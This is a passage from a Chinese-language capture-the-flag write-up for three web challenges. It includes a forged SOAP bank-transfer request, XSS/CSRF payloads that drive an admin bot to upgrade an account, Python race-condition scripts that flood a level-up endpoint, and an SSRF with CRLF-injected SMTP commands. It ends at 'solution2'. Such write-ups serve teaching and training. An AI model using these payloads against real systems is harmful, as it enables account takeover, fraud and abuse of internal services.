name=&quot;internalTransferResponse&quot;&gt;</span><br><span class="line">        &lt;part name=&quot;code&quot; type=&quot;xsd:float&quot;/&gt;</span><br><span class="line">        &lt;part name=&quot;status&quot; type=&quot;xsd:string&quot;/&gt;</span><br><span class="line">    &lt;/message&gt;</span><br><span class="line"></span><br><span class="line">    &lt;portType name=&quot;BankServicePort&quot;&gt;</span><br><span class="line">        &lt;operation name=&quot;requestBalance&quot;&gt;</span><br><span class="line">            &lt;input message=&quot;tns:BalanceRequest&quot;/&gt;</span><br><span class="line">            &lt;output message=&quot;tns:BalanceResponse&quot;/&gt;</span><br><span class="line">        &lt;/operation&gt;</span><br><span class="line">        &lt;operation name=&quot;internalTransfer&quot;&gt;</span><br><span class="line">            &lt;input message=&quot;tns:internalTransferRequest&quot;/&gt;</span><br><span class="line">            &lt;output message=&quot;tns:internalTransferResponse&quot;/&gt;</span><br><span class="line">        &lt;/operation&gt;</span><br><span class="line">    &lt;/portType&gt;</span><br><span class="line"></span><br><span class="line">    &lt;binding name=&quot;BankServiceBinding&quot; type=&quot;tns:BankServicePort&quot;&gt;</span><br><span class="line">        &lt;soap:binding style=&quot;rpc&quot; transport=&quot;http://schemas.xmlsoap.org/soap/http&quot;/&gt;</span><br><span class="line">        &lt;operation name=&quot;requestBalance&quot;&gt;</span><br><span class="line">            &lt;soap:operation soapAction=&quot;urn:requestBalanceAction&quot;/&gt;</span><br><span class="line">            &lt;input&gt;</span><br><span class="line">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;</span><br><span class="line">            &lt;/input&gt;</span><br><span class="line">            &lt;output&gt;</span><br><span class="line">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;</span><br><span class="line">            &lt;/output&gt;</span><br><span class="line">        &lt;/operation&gt;</span><br><span class="line">        &lt;operation name=&quot;internalTransfer&quot;&gt;</span><br><span class="line">            &lt;soap:operation soapAction=&quot;urn:internalTransferAction&quot;/&gt;</span><br><span class="line">            &lt;input&gt;</span><br><span class="line">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;</span><br><span class="line">            &lt;/input&gt;</span><br><span class="line">            &lt;output&gt;</span><br><span class="line">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;</span><br><span class="line">            &lt;/output&gt;</span><br><span class="line">        &lt;/operation&gt;</span><br><span class="line">    &lt;/b</span><br><span class="line"></span><br><span class="line">T 10.135.89.224:80 -&gt; 18.184.147.62:46038 [AP]</span><br><span class="line">inding&gt;</span><br><span class="line"></span><br><span class="line">    &lt;wsdl:service name=&quot;BankService&quot;&gt;</span><br><span class="line">        &lt;wsdl:port name=&quot;BankServicePort&quot; binding=&quot;tns:BankServiceBinding&quot;&gt;</span><br><span class="line">            &lt;soap:address location=&quot;http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php&quot; /&gt;</span><br><span class="line">        &lt;/wsdl:port&gt;</span><br><span class="line">    &lt;/wsdl:service&gt;</span><br><span class="line">&lt;/wsdl:definitions&gt;</span><br><span class="line"></span><br><span class="line">T 18.184.147.62:46040 -&gt; 10.135.89.224:80 [AP]</span><br><span class="line">POST /api/bankservice.php HTTP/1.1.</span><br><span class="line">Host: 123.207.90.143.</span><br><span class="line">Connection: Keep-Alive.</span><br><span class="line">User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.</span><br><span class="line">Content-Type: application/soap+xml; charset=utf-8; action=&quot;internalTransferAction&quot;.</span><br><span class="line">Content-Length: 869.</span><br><span class="line">.</span><br><span class="line">&lt;SOAP-ENV:Envelope SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;urn:Bank&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;</span><br><span class="line">      &lt;SOAP-ENV:Body&gt;</span><br><span class="line">        &lt;ns1:internalTransfer&gt;</span><br><span class="line">          &lt;receiver_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1340&lt;/receiver_wallet_num&gt;.</span><br><span class="line">&lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;.2652.&lt;/sender_wallet_num&gt;&lt;!--&lt;/receiver_wallet_num&gt;</span><br><span class="line">          &lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1340&lt;/sender_wallet_num&gt;</span><br><span class="line">          &lt;amount xsi:type=&quot;xsd:float&quot;&gt;--&gt;&lt;amount xsi:type=&quot;xsd:float&quot;&gt;750000&lt;/amount&gt;</span><br><span class="line">          &lt;token xsi:type=&quot;xsd:token&quot;&gt;somesupertokenkey1235555&lt;/token&gt;</span><br><span class="line">        &lt;/ns1:internalTransfer&gt;</span><br><span class="line">      &lt;/SOAP-ENV:Body&gt;</span><br><span class="line">    &lt;/SOAP-ENV:Envelope&gt;</span><br><span class="line">   </span><br><span class="line">T 10.135.89.224:80 -&gt; 18.184.147.62:46040 [AP]</span><br><span class="line">HTTP/1.1 404 Not Found.</span><br><span class="line">Date: Fri, 03 Aug 2018 10:08:43 GMT.</span><br><span class="line">Server: Apache/2.4.6 (CentOS) PHP/5.4.16.</span><br><span class="line">Content-Length: 217.</span><br><span class="line">Keep-Alive: timeout=5, max=100.</span><br><span class="line">Connection: Keep-Alive.</span><br><span class="line">Content-Type: text/html; charset=iso-8859-1.</span><br><span class="line">.</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL /api/bankservice.php was not found on this server.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>这样我们就拿到了token，然后就可以愉快的转账了。</p>
<p>直接按这个发这个包即可:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">T 18.184.147.62:46040 -&gt; 10.135.89.224:80 [AP]</span><br><span class="line">POST /api/bankservice.php HTTP/1.1.</span><br><span class="line">Host: 123.207.90.143.</span><br><span class="line">Connection: Keep-Alive.</span><br><span class="line">User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.</span><br><span class="line">Content-Type: application/soap+xml; charset=utf-8; action=&quot;internalTransferAction&quot;.</span><br><span class="line">Content-Length: 869.</span><br><span class="line">.</span><br><span class="line">&lt;SOAP-ENV:Envelope SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;urn:Bank&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;</span><br><span class="line">      &lt;SOAP-ENV:Body&gt;</span><br><span class="line">        &lt;ns1:internalTransfer&gt;</span><br><span class="line">          &lt;receiver_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1340&lt;/receiver_wallet_num&gt;.</span><br><span class="line">		 &lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;2652&lt;/sender_wallet_num&gt;</span><br><span class="line">		 &lt;amount xsi:type=&quot;xsd:float&quot;&gt;750000&lt;/amount&gt;</span><br><span class="line">          &lt;token xsi:type=&quot;xsd:token&quot;&gt;somesupertokenkey1235555&lt;/token&gt;</span><br><span class="line">        &lt;/ns1:internalTransfer&gt;</span><br><span class="line">      &lt;/SOAP-ENV:Body&gt;</span><br><span class="line">    &lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="Magician"><a href="#Magician" class="headerlink" title="Magician"></a>Magician</h2><ol>
<li><p>从support.php可知该题应该是XSS。修改<em>Link to Profile</em>可以判断后台bot使用<em>Firefox 61.0</em></p>
<p><img src="/assets/ctfzone/TIM截图20180803210045.png" alt=""></p>
<p>vps日志显示如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] &quot;GET / HTTP/1.1&quot; 200 65 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;</span><br><span class="line">35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;</span><br><span class="line">35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>xss漏洞</p>
<p>uuid存在反射型xss,限制长度36个字符</p>
<p><img src="/assets/ctfzone/TIM截图20180803211936.png" alt=""></p>
</li>
<li><p>how to get flag</p>
<p><img src="/assets/ctfzone/TIM截图20180803212218.png" alt=""></p>
<p>这里需要管理员将<code>Status</code>修改为<code>Premium</code></p>
</li>
<li><p>思路：</p>
<p>CSP如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: style-src &apos;self&apos; &apos;unsafe-inline&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;</span><br><span class="line">X-Frame-Options: ALLOW-FROM http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one</span><br><span class="line">X-XSS-Protection: 1; mode=block</span><br></pre></td></tr></table></figure>
<p>由于后台使用Firefox,所以<code>X-XSS-Protections</code> 没有作用。</p>
<p>通过XSRF修改状态。</p>
</li>
<li><p>解法1：</p>
<p>payload如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      window.open(&apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=&quot;&gt;&lt;svg/onload=$.globalEval(name)&apos;, `</span><br><span class="line">        $.get(&quot;manage.php&quot;, function(data)&#123;    </span><br><span class="line">                var x = /name=&quot;token&quot; value=&quot;([^&quot;]+)/.exec(data);</span><br><span class="line">                $.post(&quot;manage.php&quot;, &#123;user_uuid: &quot;86dced2a-0305-42ed-a13c-f0c2e6079805&quot;, token: x[1], status: &quot;premium&quot;&#125;); </span><br><span class="line">         &#125;);</span><br><span class="line">   `);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>含义:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(&apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=&quot;&gt;&lt;svg/onload=$.globalEval(name)&apos;, &lt;long payload&gt;)</span><br></pre></td></tr></table></figure>
<p>将 window.name 设置为<code>&lt;long payload&gt;</code>。</p>
<p>将该html放在vps上，然后提交即可。</p>
<p><img src="/assets/ctfzone/TIM截图20180803213031.png" alt=""></p>
<p>getflag</p>
<p><img src="/assets/ctfzone/TIM截图20180803212919.png" alt=""></p>
</li>
<li><p>解法2:</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=&quot;&gt;&lt;iframe onload=srcdoc=window.name&gt;</span><br></pre></td></tr></table></figure>
<p><code>iframe</code>在使用参数<code>srcdoc</code>加载的时候，会被当做同一个源。</p>
<p>测试，在Firefox下测试</p>
<p>打开Firefox,在控制台中输入:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.name=&apos;&lt;script&gt;alert(&quot;This is XSS!&quot;)&lt;/scrip&apos;+&apos;t&gt;&apos;;</span><br></pre></td></tr></table></figure>
<p>接下来一次在控制台中输入:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location = &apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E&apos;;</span><br></pre></td></tr></table></figure>
<p>发现成功弹窗户。</p>
<p><img src="/assets/ctfzone/TIM截图20180803214831.png" alt=""></p>
<p>在次输入:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location = &apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=window.name%3E&apos;;</span><br></pre></td></tr></table></figure>
<p>我们会发现，再不添加<code>srcdoc</code>参数的情况下，不在弹窗。</p>
<p><img src="/assets/ctfzone/TIM截图20180803214950.png" alt=""></p>
<p>getflag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.name = `</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.frameElement.onload=null;</span><br><span class="line">console.log(window.parent.document.body.innerHTML);</span><br><span class="line">function elo()</span><br><span class="line">&#123;</span><br><span class="line">document.getElementById(&apos;cudo&apos;).onload=null;</span><br><span class="line">r = document.getElementById(&apos;cudo&apos;).contentWindow.document;</span><br><span class="line">r.getElementsByName(&apos;user_uuid&apos;)[0].value = &apos;dbb306dd-28c1-4333-88ba-9588842f08e0&apos;;</span><br><span class="line">r.getElementsByName(&apos;status&apos;)[0].value = &apos;premium&apos;;</span><br><span class="line">r.getElementById(&apos;user_manage&apos;).submit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">`</span><br><span class="line">window.name += &apos;&lt;/scrip&apos;+&apos;t&gt;&lt;iframe src=&quot;/manage.php&quot; onload=&quot;elo()&quot; id=&quot;cudo&quot;&gt;&apos;;</span><br><span class="line">window.location = &apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E&apos;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="MMORPG-3000"><a href="#MMORPG-3000" class="headerlink" title="MMORPG 3000"></a>MMORPG 3000</h2><ol>
<li><p>注册登录</p>
</li>
<li><p>在<code>Donate</code>页面获取免费武器。</p>
<p><img src="/assets/ctfzone/TIM截图20180803220511.png" alt=""></p>
<p>图片url:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_96c5c28becf18e71190460a9955aa4d8.png</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<p><img src="/assets/ctfzone/TIM截图20180803220606.png" alt=""></p>
<p>此时，userid为860。</p>
</li>
<li><p>获取更多<code>coupon</code></p>
<p>根据上边得到结果，我们可以测试一下 <code>859</code></p>
<p><img src="/assets/ctfzone/TIM截图20180803221240.png" alt=""></p>
<p>得到url:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_537de305e941fccdbba5627e3eefbb24.png</span><br></pre></td></tr></table></figure>
<p>访问该url:</p>
<p><img src="/assets/ctfzone/TIM截图20180803221334.png" alt=""></p>
<p>得到新的<code>Coupon</code></p>
<blockquote>
<p>f598109a-942c</p>
</blockquote>
<p><img src="/assets/ctfzone/TIM截图20180803221422.png" alt=""></p>
<p>成功长了1分。</p>
<p>这时候，测试<code>1</code>.</p>
<p><img src="/assets/ctfzone/TIM截图20180803221713.png" alt=""></p>
<p>得到url:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_6512bd43d9caa6e02c990b0a82652dca.png</span><br></pre></td></tr></table></figure>
<p><img src="/assets/ctfzone/TIM截图20180803221807.png" alt=""></p>
<p>然后就可以再次得到1337分，并升级。</p>
</li>
<li><p>到达30级，新的问题。</p>
<p><img src="/assets/ctfzone/TIM截图20180803221945.png" alt=""></p>
<p>无法继续升级。</p>
</li>
<li><p>条件竞争。</p>
<p>这里猜测应该是条件竞争，这里猜测应该是执行数据库插入操作，高并发的情况下，导致重复插入多次。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function levelup() &#123;</span><br><span class="line">    balance &gt; 10:</span><br><span class="line">    是:</span><br><span class="line">    	level &gt; 30:</span><br><span class="line">    	是:</span><br><span class="line">    		exit</span><br><span class="line">    	否:</span><br><span class="line">    		level++                 |</span><br><span class="line">    		balance -= 10           |    在并发的情况下，没有锁的情况下，多个线程会同时进入该代码段 </span><br><span class="line">    		insert into table       | </span><br><span class="line">    否:</span><br><span class="line">    	exit</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>并发方案1：</p>
<p>创建1个账号，获取足够的balance。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">threadArray = []</span><br><span class="line"></span><br><span class="line">class expClass(threading.Thread):</span><br><span class="line">    burp0_url = &quot;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one:80/donate/lvlup&quot;</span><br><span class="line">    burp0_cookies = &#123;&quot;session&quot;: &quot;eyJ1aWQiOjg2NX0.Dkaijg.3FkM2nEU3xLcIvc4DPkZxkvrjFQ&quot;&#125;</span><br><span class="line">    burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-GB,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Referer&quot;: &quot;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/info&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    def __init__(self, numMain):</span><br><span class="line">        super(expClass, self).__init__()</span><br><span class="line"></span><br><span class="line">    def ham(self):</span><br><span class="line">        requests.get(self.burp0_url, headers=self.burp0_headers, cookies=self.burp0_cookies)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    def run(self):</span><br><span class="line">        self.ham()</span><br><span class="line">        </span><br><span class="line">thr = 900</span><br><span class="line"></span><br><span class="line">for i in range(0, thr ):</span><br><span class="line">        threadcan = expClass(i)</span><br><span class="line">        threadArray.append(threadcan)</span><br><span class="line">        </span><br><span class="line">for i in range(0, thr):</span><br><span class="line">        threadArray[i].start()</span><br><span class="line">        print &quot;G thread girdi =&gt; &quot; + str(i)</span><br><span class="line">for i in range(0, thr):</span><br><span class="line">        threadArray[i].join()</span><br><span class="line">        print &quot;R thread cikti =&gt; &quot; + str(i)</span><br></pre></td></tr></table></figure>
<p>并发方案2：</p>
<p>首先创建两个新的账号，并获取足够的balance。</p>
<p>race_condition.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line">from Queue import Queue</span><br><span class="line"></span><br><span class="line">max = 100</span><br><span class="line">threads = Queue()</span><br><span class="line"></span><br><span class="line">def lvlup(cookie):</span><br><span class="line">    threads.get()</span><br><span class="line">    url = &quot;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/lvlup&quot;</span><br><span class="line">    r = requests.get(url, cookies=&#123;&quot;session&quot;: cookie&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def worker2(index):</span><br><span class="line">    lvlup(&quot;eyJ1aWQiOjg2MX0.DkX_wQ.Mvm0XsHQF4JnYmca6pt8z-vUkaE&quot;)       # chrome</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def worker(index):</span><br><span class="line">    lvlup(&quot;eyJ1aWQiOjg2Mn0.DkX_zA.egXto8_Qdii7FNhj43zKekmtYP0&quot;)         # firefox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def race():</span><br><span class="line">    for i in range(max):</span><br><span class="line">        thread = threading.Thread(target=worker, args=[i])</span><br><span class="line">        thread.start()</span><br><span class="line">    for i in range(max):</span><br><span class="line">        thread = threading.Thread(target=worker2, args=[i])</span><br><span class="line">        thread.start()</span><br><span class="line">    for i in range(max * 2):</span><br><span class="line">        threads.put(i)</span><br><span class="line">    threads.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">race()</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="/assets/ctfzone/TIM截图20180803232555.png" alt=""></p>
</li>
<li><p>SSRF</p>
<p>通过条件竞争，到达31级别，出现了新的页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar</span><br></pre></td></tr></table></figure>
<p>这里存在ssrf漏洞。</p>
<p><img src="/assets/ctfzone/TIM截图20180803234111.png" alt=""></p>
<p>通过测试，可以发现过滤了<code>127.0.0.1</code>, <code>localhost</code>,可以通过<code>0.0.0.0</code>或者<code>127.0.0.2</code> bypass。</p>
<p>端口扫描:</p>
<p>示意图如下：</p>
<p><img src="/assets/ctfzone/TIM截图20180803234335.png" alt=""></p>
</li>
</ol>
<p>   经过测试，发现25端口开放。</p>
<p>   <img src="/assets/ctfzone/port_scan.png" alt=""></p>
<p>   这里存在http header注入(CRLF注入)</p>
<p>   构造paylaod:</p>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Host: [0.0.0.0</span><br><span class="line">helo 1v3m</span><br><span class="line">mail from:&lt;qaewjlfnwej@o3enzyme.com&gt;</span><br><span class="line">rcpt to:&lt;root&gt;</span><br><span class="line">data</span><br><span class="line">subject: give me flag</span><br><span class="line"></span><br><span class="line">1v3m</span><br><span class="line">.</span><br><span class="line">]:25</span><br></pre></td></tr></table></figure>
<p>   最终payload:</p>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0.0.0.0%0ahelo 1v3m%0amail from:&lt;qaewjlfnwej@o3enzyme.com&gt;%0arcpt to:&lt;root&gt;%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25</span><br></pre></td></tr></table></figure>
<ol start="7">
<li><p>solution1:</p>
<p>最终请求包:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /user/avatar HTTP/1.1</span><br><span class="line">Host: web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------4693211868403427471435307016</span><br><span class="line">Content-Length: 581</span><br><span class="line">Cookie: session=eyJ1aWQiOjgyN30.DjaSgA.ylhJXkstamQ7GahYWvUypKpvDQc</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------4693211868403427471435307016</span><br><span class="line">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------4693211868403427471435307016</span><br><span class="line">Content-Disposition: form-data; name=&quot;url&quot;</span><br><span class="line"></span><br><span class="line">https://[0.0.0.0%0ahelo 1v3m%0amail from:&lt;qaewjlfnwej@o3enzyme.com&gt;%0arcpt to:&lt;root&gt;%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25</span><br><span class="line">-----------------------------4693211868403427471435307016</span><br><span class="line">Content-Disposition: form-data; name=&quot;action&quot;</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line">-----------------------------4693211868403427471435307016--</span><br></pre></td></tr></table></figure>
</li>
<li><p>solution2</p>
